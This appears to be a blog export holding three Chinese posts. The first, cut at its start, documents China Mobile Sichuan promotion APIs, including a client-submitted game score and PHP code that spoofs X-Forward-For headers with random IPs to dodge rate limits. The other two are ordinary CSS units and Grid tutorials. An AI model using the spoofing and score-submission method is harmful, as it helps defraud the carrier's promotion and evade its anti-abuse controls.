登录Cookie中返回的SSOCookie type 是 string 0 返回示例 1234&#123; "msg":"短信验证码发送成功！", "returnCode":"1" // 1 成功 0失败&#125; 卡券转送简要描述： 卡券转送: 先获取转送验证码，才能转送 请求URL： https://wap.sc.10086.cn/scmccClient/cardCoupons.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie type 是 string 4 phoneInput 是 string 接收者的手机号 smsInput 是 string 转送验证码 childCardNum 是 string 对应送的卡券号码 couponNum 返回示例 12345&#123; "returnCode":"0", // 1 成功 0失败 "msg":"卡券已经使用，无法进行转赠！", "retObj":null&#125; 一起奔跑吧活动2020年移动618送流量活动，每个手机号每天有两次抽奖机会，最高可以获得100M+300M+500M+1G流量或者0.66元+0.99元+5元花费奖励。 当前活动已结束，如果想玩这个游戏可以点击 一起奔跑吧活动 游戏初始化简要描述： 该接口获取当前用户到了哪一个分数级别，并且有哪些奖项可以领取 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckday/init.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&#123; "result": &#123; "obj": &#123; "isHand": "0", // 0代表办理过一元会员 其他都是未办理一元会员 "sectionList": [ &#123; "percentList": [ // 当前进度 &#123; "totalCount": "608", // 当前积分数 "currentStart": "600", "currentEnd": "1000", // 表示当前再600-1000段位内 "section": 4 // 计算进度条 &#125; ] &#125;, &#123; "otherList": [ &#123; "F_IS_NEED_UNLOCK": "0", // F_IS_NEED_UNLOCK 0 不需要好友解锁 1 需要好友解锁 "F_ID": "GIFT000001", // 奖品ID "hasDrawed": "1", // 0未抽奖 1已抽奖 "F_START": "100", "F_END": "300", "F_BEST_GIFT": "100M" // 该阶段最好的奖品 &#125;, &#123; "hasLocked": "1", // F_IS_NEED_UNLOCK=1时有该字段，1表示好友已经解锁 0表示等好友解锁 "F_IS_NEED_UNLOCK": "1", "F_ID": "GIFT000002", "hasDrawed": "1", "F_START": "300", "F_END": "600", "F_BEST_GIFT": "0.66元/300M" &#125;, &#123; "hasLocked": "1", "F_IS_NEED_UNLOCK": "1", "F_ID": "GIFT000003", "hasDrawed": "1", "F_START": "600", "F_END": "1000", "F_BEST_GIFT": "0.99元/500M" &#125;, &#123; "hasLocked": "0", "F_IS_NEED_UNLOCK": "1", "F_ID": "GIFT000004", "hasDrawed": "0", "F_START": "1000", "F_END": "9999", "F_BEST_GIFT": "5元/1G" &#125; ] &#125; ], "jh_status": "0", "join": "3",// 1表示可以开始游戏 2表示需要分享好友获取游戏机会 其他表示次数用完 "sharePhone": "xxxx"// 当前需要解锁的手机号码 &#125;, "code": 0,// 0表示认证用户 1表示用户未登录 4表示活动未开始或已结束 其他表示服务器繁忙 "info": "查询成功" &#125;&#125; 游戏开始简要描述： 该接口获取是否可以游戏，同时返回游戏参数，频率限制15秒 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameStart.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 123456789101112131415161718&#123; "result": &#123; "obj": &#123; "scoreConfig": "-2,-2,-3,-5,-8,2,3,5,5,5,5,5,10,10,15,15",// 分值规律，负数表示减分，正数表示加分 "totalScore": 528,// 当前总分值 "keys": "d36100f7-aae0-4ed5-ae23-dc2018ed9e94",// 当前分值对应的key，游戏结束后需要该参数 "progressBarConfig": [ // 段位 0, 100, 300, 600, 1000 ] &#125;, "code": 0, // 0表示可以开始，1表示登录超时，7,3表示游戏次数不够 2表示服务器忙 "info": "游戏开始" &#125;&#125; 游戏结束简要描述： 返回用户玩游戏获得积分结果，这个接口后台不知道是如何处理的，当参数传递错误，返回的body为空，猜测是一个BUG，频率限制15秒 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckDayGame/gameOver.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie key 是 string 游戏开始接口获取 userScore int string 获得分值，游戏开始接口获取:scoreConfig里面正数则的总和 scoreDetail 否 string 可选，分数详情，例如： 30,30,20,10,5,5 返回示例 123456789101112131415161718&#123; "result":&#123; "obj":&#123; "isAchieved":true,// 达到分数 "needScore":155, // 距离下一个段位需要的分数 "totalScore":145,// 本次游戏后游戏总分 "phone":"18281872608",// 玩游戏的手机号码 "countStatus":1, // 0表示这是最后一次游戏，1表示下次一游戏需要分享 "isDraw":false, // 是否已经抽奖 true表示已抽 false表示未抽 "giftId":"GIFT000001",// 当前正在挑战的奖品ID "bestGift":"100M", // 能够获得最佳的礼物 "isUnlock":false, // 是否已经解锁，true是 false没有 "isNeedUnlock":false// 是否需要解锁 true需要解锁 false不需要解说 &#125;, "code":0,// 0表示提交成功 1表示登录超时 "info":"游戏结束" &#125;&#125; 分享接口简要描述： 每个用户每天拥有两次玩游戏的机会，请求该接口可以再玩一次，频率限制15秒 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckday/saveShareLog.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie 返回示例 1234567&#123; "result": &#123; "obj": null, "code": 0,// 0表示分享成功 1表示未登录 "info": "入库成功" &#125;&#125; 好友解锁简要描述： 如果用户获得积分达到了抽奖条件，而这个奖励需要好友激活，请求该接口可以帮助用户激活，频率限制20秒 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckday/unlock.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie,注意这里是你好友的cookie，因为是他帮你解锁，而不是自己给自己解锁 sharePhone 是 string 需要解锁的手机号码，该字段需要base64编码 gift_id 是 string 解锁的礼物ID,该字段需要base64编码, 例如 base64encode(‘GIFT000001’) 返回示例 1234567&#123; "result":&#123; "obj":2, "code":0, // 0表示解锁成功 3未达到抽奖条件,不能解锁! 4活动未开始或已结束! 20 20秒内不能重复点击，请稍后再试! 5 助力人不能是自己 6步数区间未配置 7分享人未满足改档分数，认证失败 11解锁人已解锁，认证失败 12分享人已抽过该礼包 "info":"解锁成功" &#125;&#125; 活动抽奖简要描述： 奖励处理激活状态后可以请求该接口获取奖品，频率限制15秒 请求URL： https://wap.sc.10086.cn/scmccCampaign/luckday/draw.do 请求方式： POST 参数： 参数名 必选 类型 说明 SSOCookie 是 string 登录Cookie中返回的SSOCookie gift_id 是 string 解锁的礼物ID,该字段需要base64编码, 例如 base64encode(‘GIFT000001’) 返回示例 12345678910111213&#123; "result":&#123; "obj":&#123; // 抽奖的奖品 "f_prize":"30M国内流量券", "f_sendType":"5",// 5流量 2 话费 "f_num":"30", // 如果是流量这里表示抽中多少M流量 如果是话费这里是抽中多少元话费 "f_id":"1",// 礼品ID "gift_id":"GIFT000001"// 礼物ID &#125;, "code":0,// 0中奖 1未登录 7未中奖 "info":"抽奖成功" &#125;&#125; 注意接口做了IP访问频率限制，可以尝试在请求头部改变 X-Forward-For 来解决。下面是示例代码: 123456789101112131415161718192021// 随机生成国内的IP地址function rand_ip()&#123; $ip_long = array( array('607649792', '608174079'), // 36.56.0.0-36.63.255.255 array('1038614528', '1039007743'), // 61.232.0.0-61.237.255.255 array('1783627776', '1784676351'), // 106.80.0.0-106.95.255.255 array('2035023872', '2035154943'), // 121.76.0.0-121.77.255.255 array('2078801920', '2079064063'), // 123.232.0.0-123.235.255.255 array('-1950089216', '-1948778497'), // 139.196.0.0-139.215.255.255 array('-1425539072', '-1425014785'), // 171.8.0.0-171.15.255.255 array('-1236271104', '-1235419137'), // 182.80.0.0-182.92.255.255 array('-770113536', '-768606209'), // 210.25.0.0-210.47.255.255 array('-569376768', '-564133889'), // 222.16.0.0-222.95.255.255 ); $rand_key = mt_rand(0, 9); return $ip = long2ip(mt_rand($ip_long[$rand_key][0], $ip_long[$rand_key][1]));&#125;// 调用$curl = new Curl();$curl-&gt;setHeader('X-Forward-For', rand_ip());]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS计量单位]]></title>
    <url>%2Farticles%2FCSS%E8%AE%A1%E9%87%8F%E5%8D%95%E4%BD%8D%2F</url>
    <content type="text"><![CDATA[我们很容易无法摆脱的使用我们所熟悉的CSS技术，当新的问题出现，这样会使我们处于不利的地位。 随着Web继续的发展，对新的解决方案的需求也会继续增大。因此，作为网页设计师和前端开发人员，我们别无选择，只有去了解我们的工具集并且熟悉它。 这意味着我们还要了解一些特殊的工具-那些不经常使用的，但是当需要它们的时候，它们恰恰是最正确的工具。 今天，我将要向你介绍一些你以前可能不知道的CSS工具。这些工具都是计量单位，就像像素或者相对单位,但是很可能你从来没听说过它们！让我们一探究竟吧。 rem我们将从你已经熟悉的东西开始。em单位被定义为当前字体大小。例如，如果你在body元素上设置一个字体大小，那么在body元素内的任何子元素的em值都等于这个字体大小。 123456789101112&lt;body&gt; &lt;div class="test"&gt;Test&lt;/div&gt;&lt;/body&gt;&lt;style&gt;body &#123; font-size: 14px;&#125;div &#123; font-size: 1.2em; // calculated at 14px * 1.2, or 16.8px&#125;&lt;/style&gt; 在这里，我们说这个div将有一个1.2em的font-size。它是所继承的字体大小的1.2倍，在这个例子中为14px。结果为16.8px. 但是，当你在每个元素内都级联em定义的字体大小将会发生什么？在下面的代码片段中我们应用和上面一模一样的CSS.每个div从它们的父节点继承字体大小，带给我们逐渐增加的字体大小。 1234567891011&lt;body&gt; &lt;div&gt; Test &lt;!-- 14 * 1.2 = 16.8px --&gt; &lt;div&gt; Test &lt;!-- 16.8 * 1.2 = 20.16px --&gt; &lt;div&gt; Test &lt;!-- 20.16 * 1.2 = 24.192px --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt; 虽然在某些情况下可能需要这个，但是通常你可能想基于一个唯一的度量标准来按比例缩放。在这种情况下，你应该用rem。rem中的”r“代表”root“；这等同于font-size基于根元素进行设置；在大多数情况下根元素为html元素。 123456html &#123; font-size: 14px;&#125;div &#123; font-size: 1.2rem;&#125; 在上一个示例中三个嵌套的div的字体大小计算结果都为16.8px。 对网格布局的好处 rem不是只对定义字体大小有用。比如，你可以使用rem把整个网格系统或者UI样式库基于HTML根元素的字体大小上,然后在特定的地方使用em比例缩放。这将带给你更加可预测的字体大小和比例缩放。 123.container &#123; width: 70rem; // 70 * 14px = 980px&#125; 从概念上讲，像这样一个策略背后的想法是为了允许你的界面随着你的内容按比例缩放。然而，这可能不一定对每个案例都有意义。 “rem(root em)单位”的兼容性列表。 vh 和 vw响应式网页设计技术很大程度上依赖于比例规则。然而，CSS比例不总是每个问题的最佳解决方案。CSS宽度是相对于最近的包含父元素。如果你想使用显示窗口的宽度或高度而不是父元素的宽度将会怎么样？这正是vh和vw单位所提供的。 vh等于viewport高度的1/100.例如，如果浏览器的高是900px,1vh求得的值为9px。同理，如果显示窗口宽度为750px,1vw求得的值为7.5px。 这些规则表面上看起来有无尽的用途。例如，做一个占满高度的或者接近占满高度的幻灯片，可以用一个非常简单的方法实现，只要用一行CSS： 123.slide &#123; height: 100vh;&#125; 设想你想要一个占满屏幕宽度的标题。为做到这一点，你将会用vw来设置一个字体大小。这个大小将会随着浏览器的宽度按比例缩放。 视窗单位: vw, vh的兼容性列表。 vmin 和 vmaxvh和vm总是与视口的高度和宽度有关，与之不同的，vmin和vmax是与这次宽度和高度的最大值或最小值有关，取决于哪个更大和更小。例如，如果浏览器设置为1100px宽、700px高，1vmin会是7px,1vmax为11px。然而，如果宽度设置为800px，高度设置为1080px，1vmin将会等于8px而1vmax将会是10.8px。 所以你什么时候可能用到这些值？ 设想你需要一个总是在屏幕上可见的元素。使用高度和宽度设置为低于100的vmin值将可以实现这个效果。例如，一个正方形的元素总是至少接触屏幕的两条边可能是这样定义的： 1234.box &#123; height: 100vmin; width: 100vmin;&#125; 如果你需要一个总是覆盖可视窗口的正方形(一直接触屏幕的四条边),使用相同的规则只是把单位换成vmax。 1234.box &#123; height: 100vmax; width: 100vmax;&#125; 这些规则的组合提供了一个非常灵活的方式，用新的、令人兴奋的方式利用你的可视窗口的大小。 Viewport units: vmin, vmax兼容列表。 ex 和 chex和ch单位，与em和rem相似，依赖于当前字体和字体大小。然而，与em和rem不同的是，这两个单位只也依赖于font-family，因为它们被定为基于特殊字体的法案。 ch单位，或者字符单位被定义为0字符的宽度的“先进的尺寸”。在“Eric Meyer’s的博客”中可以找到一些非常有趣的讨论关于这意味着什么，但是基本的概念是，给定一个等宽字体的字体，一个N个字符单位宽的盒子，比如width：40ch;,可以一直容纳一个有40个字符的应用那个特定字体的字符串。虽然这个特殊规则的传统用途与列出盲文有关，但是这里创造性的可行性一定会超越这些简单的用途。 ex单位被定义为”当前字体的x-height或者一个em的一半”。给定的字体的x-height是指那个字体的小写x的高度。通常，这是这个字体的中间的标志。 x-height: 小写字母x的高度(阅读更多关于The Anatomy of Web Typography) 对于这种单位有很多的用途，大多数是用于排版的微调。例如，sup元素,代表_上标_，可以用相对定位和一个1ex的底部值在行内被推高。类似地，你可以拉低一个下标元素。浏览器默认支持这些利用上标和下标特性的vertical-align规则，但是如果你想要更精细的控制，你可以像这样更明确的处理样式： 12345678sup &#123; position: relative; bottom: 1ex;&#125;sub &#123; position: relative; bottom: -1ex;&#125; ex单位在CSS1中已经存在，但是你不会找到对ch单位有像这样坚实的支持。具体支持，在Eric Meyer’s 的博客中查看CSS单位和值。 结论密切关注CSS的持续发展和扩张是非常重要的，一边在你的工具集里知道所有的工具。也许你会遇到一个特殊的问题需要一个意想不到的解决方案，利用这些更隐蔽的计量单位之一。花时间去阅读新规范，记录来自好的资源的新闻资讯！ 扩展 Taking the “Erm..” Out of Ems Taking Ems Even Further Caniuse Viewport units CSS的font-size属性 Rem VS Px CSS的长度单位 CSS3的REM设置字体大小 CSS中强大的EM 本文根据@Jonathan Cutrell的《7 CSS Units You Might Not Know About》所译。]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Grid布局]]></title>
    <url>%2Farticles%2FGrid%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[一、概述网格布局（Grid）是最强大的 CSS 布局方案。 它将网页划分成一个个网格，可以任意组合不同的网格，做出各种各样的布局。以前，只能通过复杂的 CSS 框架达到的效果，现在浏览器内置了。 上图这样的布局，就是 Grid 布局的拿手好戏。 Grid 布局与 Flex 布局有一定的相似性，都可以指定容器内部多个项目的位置。但是，它们也存在重大区别。 Flex 布局是轴线布局，只能指定”项目”针对轴线的位置，可以看作是一维布局。Grid 布局则是将容器划分成”行”和”列”，产生单元格，然后指定”项目所在”的单元格，可以看作是二维布局。Grid 布局远比 Flex 布局强大。 二、基本概念学习 Grid 布局之前，需要了解一些基本概念。 2.1 容器和项目采用网格布局的区域，称为”容器”（container）。容器内部采用网格定位的子元素，称为”项目”（item）。 12345&lt;div&gt; &lt;div&gt;&lt;p&gt;1&lt;/p&gt;&lt;/div&gt; &lt;div&gt;&lt;p&gt;2&lt;/p&gt;&lt;/div&gt; &lt;div&gt;&lt;p&gt;3&lt;/p&gt;&lt;/div&gt;&lt;/div&gt; 上面代码中，最外层的&lt;div&gt;元素就是容器，内层的三个&lt;div&gt;元素就是项目。 注意：项目只能是容器的顶层子元素，不包含项目的子元素，比如上面代码的&lt;p&gt;元素就不是项目。Grid 布局只对项目生效。 2.2 行和列容器里面的水平区域称为”行”（row），垂直区域称为”列”（column）。 上图中，水平的深色区域就是”行”，垂直的深色区域就是”列”。 2.3 单元格行和列的交叉区域，称为”单元格”（cell）。 正常情况下，n行和m列会产生n x m个单元格。比如，3行3列会产生9个单元格。 2.4 网格线划分网格的线，称为”网格线”（grid line）。水平网格线划分出行，垂直网格线划分出列。 正常情况下，n行有n + 1根水平网格线，m列有m + 1根垂直网格线，比如三行就有四根水平网格线。 上图是一个 4 x 4 的网格，共有5根水平网格线和5根垂直网格线。 三、容器属性Grid 布局的属性分成两类。一类定义在容器上面，称为容器属性；另一类定义在项目上面，称为项目属性。这部分先介绍容器属性。 3.1 display 属性display: grid指定一个容器采用网格布局。 123div &#123; display: grid;&#125; 上图是display: grid的效果。 默认情况下，容器元素都是块级元素，但也可以设成行内元素。 123div &#123; display: inline-grid;&#125; 上面代码指定div是一个行内元素，该元素内部采用网格布局。 上图是display: inline-grid的效果。 注意，设为网格布局以后，容器子元素（项目）的float、display: inline-block、display: table-cell、vertical-align和column-*等设置都将失效。 3.2 grid-template-columns，grid-template-rows 属性容器指定了网格布局以后，接着就要划分行和列。grid-template-columns属性定义每一列的列宽，grid-template-rows属性定义每一行的行高。 12345.container &#123; display: grid; grid-template-columns: 100px 100px 100px; grid-template-rows: 100px 100px 100px;&#125; 上面代码指定了一个三行三列的网格，列宽和行高都是100px。 除了使用绝对单位，也可以使用百分比。 12345.container &#123; display: grid; grid-template-columns: 33.33% 33.33% 33.33%; grid-template-rows: 33.33% 33.33% 33.33%;&#125; （1）repeat() 有时候，重复写同样的值非常麻烦，尤其网格很多时。这时，可以使用repeat()函数，简化重复的值。上面的代码用repeat()改写如下。 12345.container &#123; display: grid; grid-template-columns: repeat(3, 33.33%); grid-template-rows: repeat(3, 33.33%);&#125; repeat()接受两个参数，第一个参数是重复的次数（上例是3），第二个参数是所要重复的值。 repeat()重复某种模式也是可以的。 1grid-template-columns: repeat(2, 100px 20px 80px); 上面代码定义了6列，第一列和第四列的宽度为100px，第二列和第五列为20px，第三列和第六列为80px。 （2）auto-fill 关键字 有时，单元格的大小是固定的，但是容器的大小不确定。如果希望每一行（或每一列）容纳尽可能多的单元格，这时可以使用auto-fill关键字表示自动填充。 1234.container &#123; display: grid; grid-template-columns: repeat(auto-fill, 100px);&#125; 上面代码表示每列宽度100px，然后自动填充，直到容器不能放置更多的列。 （3）fr 关键字 为了方便表示比例关系，网格布局提供了fr关键字（fraction 的缩写，意为”片段”）。如果两列的宽度分别为1fr和2fr，就表示后者是前者的两倍。 1234.container &#123; display: grid; grid-template-columns: 1fr 1fr;&#125; 上面代码表示两个相同宽度的列。 fr可以与绝对长度的单位结合使用，这时会非常方便。 1234.container &#123; display: grid; grid-template-columns: 150px 1fr 2fr;&#125; 上面代码表示，第一列的宽度为150像素，第二列的宽度是第三列的一半。 （4）minmax() minmax()函数产生一个长度范围，表示长度就在这个范围之中。它接受两个参数，分别为最小值和最大值。 1grid-template-columns: 1fr 1fr minmax(100px, 1fr); 上面代码中，minmax(100px, 1fr)表示列宽不小于100px，不大于1fr。 （5）auto 关键字 auto关键字表示由浏览器自己决定长度。 1grid-template-columns: 100px auto 100px; 上面代码中，第二列的宽度，基本上等于该列单元格的最大宽度，除非单元格内容设置了min-width，且这个值大于最大宽度。 （6）网格线的名称 grid-template-columns属性和grid-template-rows属性里面，还可以使用方括号，指定每一根网格线的名字，方便以后的引用。 12345.container &#123; display: grid; grid-template-columns: [c1] 100px [c2] 100px [c3] auto [c4]; grid-template-rows: [r1] 100px [r2] 100px [r3] auto [r4];&#125; 上面代码指定网格布局为3行 x 3列，因此有4根垂直网格线和4根水平网格线。方括号里面依次是这八根线的名字。 网格布局允许同一根线有多个名字，比如[fifth-line row-5]。 （7）布局实例 grid-template-columns属性对于网页布局非常有用。两栏式布局只需要一行代码。 1234.wrapper &#123; display: grid; grid-template-columns: 70% 30%;&#125; 上面代码将左边栏设为70%，右边栏设为30%。 传统的十二网格布局，写起来也很容易。 1grid-template-columns: repeat(12, 1fr); 3.3 grid-row-gap，grid-column-gap，grid-gap 属性grid-row-gap属性设置行与行的间隔（行间距），grid-column-gap属性设置列与列的间隔（列间距）。 1234.container &#123; grid-row-gap: 20px; grid-column-gap: 20px;&#125; 上面代码中，grid-row-gap用于设置行间距，grid-column-gap用于设置列间距。 grid-gap属性是grid-column-gap和grid-row-gap的合并简写形式，语法如下。 1grid-gap: &lt;grid-row-gap&gt; &lt;grid-column-gap&gt;; 因此，上面一段 CSS 代码等同于下面的代码。 123.container &#123; grid-gap: 20px 20px;&#125; 如果grid-gap省略了第二个值，浏览器认为第二个值等于第一个值。 根据最新标准，上面三个属性名的grid-前缀已经删除，grid-column-gap和grid-row-gap写成column-gap和row-gap，grid-gap写成gap。 3.4 grid-template-areas 属性网格布局允许指定”区域”（area），一个区域由单个或多个单元格组成。grid-template-areas属性用于定义区域。 12345678.container &#123; display: grid; grid-template-columns: 100px 100px 100px; grid-template-rows: 100px 100px 100px; grid-template-areas: 'a b c' 'd e f' 'g h i';&#125; 上面代码先划分出9个单元格，然后将其定名为a到i的九个区域，分别对应这九个单元格。 多个单元格合并成一个区域的写法如下。 123grid-template-areas: 'a a a' 'b b b' 'c c c'; 上面代码将9个单元格分成a、b、c三个区域。 下面是一个布局实例。 123grid-template-areas: "header header header" "main main sidebar" "footer footer footer"; 上面代码中，顶部是页眉区域header，底部是页脚区域footer，中间部分则为main和sidebar。 如果某些区域不需要利用，则使用”点”（.）表示。 123grid-template-areas: 'a . c' 'd . f' 'g . i'; 上面代码中，中间一列为点，表示没有用到该单元格，或者该单元格不属于任何区域。 注意，区域的命名会影响到网格线。每个区域的起始网格线，会自动命名为区域名-start，终止网格线自动命名为区域名-end。 比如，区域名为header，则起始位置的水平网格线和垂直网格线叫做header-start，终止位置的水平网格线和垂直网格线叫做header-end。 3.5 grid-auto-flow 属性划分网格以后，容器的子元素会按照顺序，自动放置在每一个网格。默认的放置顺序是”先行后列”，即先填满第一行，再开始放入第二行，即下图数字的顺序。 这个顺序由grid-auto-flow属性决定，默认值是row，即”先行后列”。也可以将它设成column，变成”先列后行”。 1grid-auto-flow: column; 上面代码设置了column以后，放置顺序就变成了下图。 grid-auto-flow属性除了设置成row和column，还可以设成row dense和column dense。这两个值主要用于，某些项目指定位置以后，剩下的项目怎么自动放置。 下面的例子让1号项目和2号项目各占据两个单元格，然后在默认的grid-auto-flow: row情况下，会产生下面这样的布局。 上图中，1号项目后面的位置是空的，这是因为3号项目默认跟着2号项目，所以会排在2号项目后面。 现在修改设置，设为row dense，表示”先行后列”，并且尽可能紧密填满，尽量不出现空格。 1grid-auto-flow: row dense; 上面代码的效果如下。 上图会先填满第一行，再填满第二行，所以3号项目就会紧跟在1号项目的后面。8号项目和9号项目就会排到第四行。 如果将设置改为column dense，表示”先列后行”，并且尽量填满空格。 1grid-auto-flow: column dense; 上面代码的效果如下。 上图会先填满第一列，再填满第2列，所以3号项目在第一列，4号项目在第二列。8号项目和9号项目被挤到了第四列。 3.6 justify-items，align-items，place-items 属性justify-items属性设置单元格内容的水平位置（左中右），align-items属性设置单元格内容的垂直位置（上中下）。 1234.container &#123; justify-items: start | end | center | stretch; align-items: start | end | center | stretch;&#125; 这两个属性的写法完全相同，都可以取下面这些值。 start：对齐单元格的起始边缘。 end：对齐单元格的结束边缘。 center：单元格内部居中。 stretch：拉伸，占满单元格的整个宽度（默认值）。 123.container &#123; justify-items: start;&#125; 上面代码表示，单元格的内容左对齐，效果如下图。 123.container &#123; align-items: start;&#125; 上面代码表示，单元格的内容头部对齐，效果如下图。 place-items属性是align-items属性和justify-items属性的合并简写形式。 1place-items: &lt;align-items&gt; &lt;justify-items&gt;; 下面是一个例子。 1place-items: start end; 如果省略第二个值，则浏览器认为与第一个值相等。 3.7 justify-content ,align-content,place-content 属性justify-content属性是整个内容区域在容器里面的水平位置（左中右），align-content属性是整个内容区域的垂直位置（上中下）。 1234.container &#123; justify-content: start | end | center | stretch | space-around | space-between | space-evenly; align-content: start | end | center | stretch | space-around | space-between | space-evenly; &#125; 这两个属性的写法完全相同，都可以取下面这些值。（下面的图都以justify-content属性为例，align-content属性的图完全一样，只是将水平方向改成垂直方向。） start - 对齐容器的起始边框。 end - 对齐容器的结束边框。 center - 容器内部居中。 stretch - 项目大小没有指定时，拉伸占据整个网格容器。 space-around - 每个项目两侧的间隔相等。所以，项目之间的间隔比项目与容器边框的间隔大一倍。 space-between - 项目与项目的间隔相等，项目与容器边框之间没有间隔。 space-evenly - 项目与项目的间隔相等，项目与容器边框之间也是同样长度的间隔。 place-content属性是align-content属性和justify-content属性的合并简写形式。 1place-content: &lt;align-content&gt; &lt;justify-content&gt; 下面是一个例子。 1place-content: space-around space-evenly; 如果省略第二个值，浏览器就会假定第二个值等于第一个值。 3.8 grid-auto-columns, grid-auto-rows 属性有时候，一些项目的指定位置，在现有网格的外部。比如网格只有3列，但是某一个项目指定在第5行。这时，浏览器会自动生成多余的网格，以便放置项目。 grid-auto-columns属性和grid-auto-rows属性用来设置，浏览器自动创建的多余网格的列宽和行高。它们的写法与grid-template-columns和grid-template-rows完全相同。如果不指定这两个属性，浏览器完全根据单元格内容的大小，决定新增网格的列宽和行高。 下面的例子里面，划分好的网格是3行 x 3列，但是，8号项目指定在第4行，9号项目指定在第5行。 123456.container &#123; display: grid; grid-template-columns: 100px 100px 100px; grid-template-rows: 100px 100px 100px; grid-auto-rows: 50px; &#125; 上面代码指定新增的行高统一为50px（原始的行高为100px）。 3.9 grid-template, grid 属性grid-template属性是grid-template-columns、grid-template-rows和grid-template-areas这三个属性的合并简写形式。 grid属性是grid-template-rows、grid-template-columns、grid-template-areas、 grid-auto-rows、grid-auto-columns、grid-auto-flow这六个属性的合并简写形式。 从易读易写的角度考虑，还是建议不要合并属性，所以这里就不详细介绍这两个属性了。 四、项目属性下面这些属性定义在项目上面。 4.1 grid-column-start，grid-column-end，grid-row-start，grid-row-end属性项目的位置是可以指定的，具体方法就是指定项目的四个边框，分别定位在哪根网格线。 grid-column-start：左边框所在的垂直网格线 grid-column-end：右边框所在的垂直网格线 grid-row-start：上边框所在的水平网格线 grid-row-end：下边框所在的水平网格线 1234.item-1 &#123; grid-column-start: 2; grid-column-end: 4;&#125; 上面代码指定，1号项目的左边框是第二根垂直网格线，右边框是第四根垂直网格线。 上图中，只指定了1号项目的左右边框，没有指定上下边框，所以会采用默认位置，即上边框是第一根水平网格线，下边框是第二根水平网格线。 除了1号项目以外，其他项目都没有指定位置，由浏览器自动布局，这时它们的位置由容器的grid-auto-flow属性决定，这个属性的默认值是row，因此会”先行后列”进行排列。读者可以把这个属性的值分别改成column、row dense和column dense，看看其他项目的位置发生了怎样的变化。 下面的例子是指定四个边框位置的效果。 123456.item-1 &#123; grid-column-start: 1; grid-column-end: 3; grid-row-start: 2; grid-row-end: 4;&#125; 这四个属性的值，除了指定为第几个网格线，还可以指定为网格线的名字。 1234.item-1 &#123; grid-column-start: header-start; grid-column-end: header-end;&#125; 上面代码中，左边框和右边框的位置，都指定为网格线的名字。 这四个属性的值还可以使用span关键字，表示”跨越”，即左右边框（上下边框）之间跨越多少个网格。 123.item-1 &#123; grid-column-start: span 2;&#125; 上面代码表示，1号项目的左边框距离右边框跨越2个网格。 这与下面的代码效果完全一样。 123.item-1 &#123; grid-column-end: span 2;&#125; 使用这四个属性，如果产生了项目的重叠，则使用z-index属性指定项目的重叠顺序。 4.2 grid-column,grid-row 属性grid-column属性是grid-column-start和grid-column-end的合并简写形式，grid-row属性是grid-row-start属性和grid-row-end的合并简写形式。 1234.item &#123; grid-column: / ; grid-row: / ;&#125; 下面是一个例子。 1234567891011.item-1 &#123; grid-column: 1 / 3; grid-row: 1 / 2;&#125;/* 等同于 */.item-1 &#123; grid-column-start: 1; grid-column-end: 3; grid-row-start: 1; grid-row-end: 2;&#125; 上面代码中，项目item-1占据第一行，从第一根列线到第三根列线。 这两个属性之中，也可以使用span关键字，表示跨越多少个网格。 1234567891011.item-1 &#123; background: #b03532; grid-column: 1 / 3; grid-row: 1 / 3;&#125;/* 等同于 */.item-1 &#123; background: #b03532; grid-column: 1 / span 2; grid-row: 1 / span 2;&#125; 上面代码中，项目item-1占据的区域，包括第一行 + 第二行、第一列 + 第二列。 斜杠以及后面的部分可以省略，默认跨越一个网格。 1234.item-1 &#123; grid-column: 1; grid-row: 1;&#125; 上面代码中，项目item-1占据左上角第一个网格。 4.3 grid-area 属性grid-area属性指定项目放在哪一个区域。 123.item-1 &#123; grid-area: e;&#125; 上面代码中，1号项目位于e区域，效果如下图。 grid-area属性还可用作grid-row-start、grid-column-start、grid-row-end、grid-column-end的合并简写形式，直接指定项目的位置。 123.item &#123; grid-area: &lt;row-start&gt; / &lt;column-start&gt; / &lt;row-end&gt; / &lt;column-end&gt;;&#125; 下面是一个例子。 123.item-1 &#123; grid-area: 1 / 1 / 3 / 3;&#125; 4.4 justify-self,align-self,place-self 属性justify-self属性设置单元格内容的水平位置（左中右），跟justify-items属性的用法完全一致，但只作用于单个项目。 align-self属性设置单元格内容的垂直位置（上中下），跟align-items属性的用法完全一致，也是只作用于单个项目。 1234.item &#123; justify-self: start | end | center | stretch; align-self: start | end | center | stretch;&#125; 这两个属性都可以取下面四个值。 start：对齐单元格的起始边缘。 end：对齐单元格的结束边缘。 center：单元格内部居中。 stretch：拉伸，占满单元格的整个宽度（默认值）。 下面是justify-self: start的例子。 123 .item-1 &#123; justify-self: start;&#125; place-self属性是align-self属性和justify-self属性的合并简写形式。 1place-self: &lt;align-self&gt; &lt;justify-self&gt;; 下面是一个例子。 1place-self: center center; 如果省略第二个值，place-self属性会认为这两个值相等。 五、兼容性在开发之前，你得先了解其兼容性。总体来说，Grid兼容性还是不够全面，但如果一些公司用于内部系统开发，grid布局将会是一个不错的选择。数据来源：传送门 六、参考链接A Complete Guide to Grid, by Chris HouseUnderstanding the CSS Grid Layout Module, by Ian YatesHow to Build an Off-Canvas Navigation With CSS Grid, Ian YatesIntroduction to the CSS Grid Layout With Examples, Dogacan BilgiliLearn CSS Grid, Jonathan SuhHow I stopped using Bootstrap’s layout thanks to CSS Grid, Cédric Kui]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
  </entry>
  <entry>
